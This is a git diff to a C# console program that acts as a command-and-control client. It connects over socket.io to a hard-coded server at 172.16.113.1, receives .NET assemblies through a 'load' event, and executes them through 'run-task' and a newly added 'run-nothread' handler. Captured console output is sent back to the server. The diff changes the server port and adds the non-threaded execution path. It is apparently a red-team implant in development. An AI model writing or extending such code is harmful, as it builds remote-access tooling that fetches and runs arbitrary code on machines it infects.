@@ -35,7 +35,7 @@ namespace ConsoleApp1
             }
             while (true) { };
         }
-        static async void Go(string home = "http://172.16.113.1:3000/client")
+        static async void Go(string home = "http://172.16.113.1:8888/")
         {
             // create new socket.io client
             var client = new SocketIO(home);
@@ -57,7 +57,7 @@ namespace ConsoleApp1
                 client.EmitAsync("pong");
             });
 
-            // Client load .NET assembly (dll) // TODO: Wire this into the server
+            // Client load .NET assembly (dll)
             client.On("load", response =>
             {
                 try
@@ -71,11 +71,17 @@ namespace ConsoleApp1
                 }
             });
 
-            // Client invoke loaded assembly (.NET DLL) // TODO: Wire this into the server, send output
+            // Client invoke loaded assembly (.NET DLL)
             client.On("run-task", response =>
             {
                 Thread myNewThread = new Thread(() => RunAndReturn(client, response));
                 myNewThread.Start();
+            });
+
+            // Client invoke loaded assembly non-threaded
+            client.On("run-nothread", response =>
+            {
+                RunAndReturn(client, response);
             });
 
             // add an event that happens when we first connect
@@ -121,21 +127,21 @@ namespace ConsoleApp1
                         var sw = new StringWriter();
                         Console.SetOut(sw);
 
-                        object instance = Activator.CreateInstance(type);
-                        if (args.Length == 0)
-                        {
-                            methodOutput = method.Invoke(instance, new object[] { new string[0] }); // empty arguments
-                        }
-                        else
-                        {
-                            methodOutput = method.Invoke(instance, new object[] { args });
-                        }
+                            object instance = Activator.CreateInstance(type);
+                            if (args.Length == 0)
+                            {
+                                methodOutput = method.Invoke(instance, new object[] { new string[0] }); // empty arguments
+                            }
+                            else
+                            {
+                                methodOutput = method.Invoke(instance, new object[] { args });
+                            }
 
-                        //Restore output -- Stops redirecting output
-                        Console.SetOut(prevConOut);
-                        string strOutput = sw.ToString();
+                            //Restore output -- Stops redirecting output
+                            Console.SetOut(prevConOut);
+                            string strOutput = sw.ToString();
 
-                        return (methodOutput, strOutput);
+                            return (methodOutput, strOutput);
                     }
                 }
             }
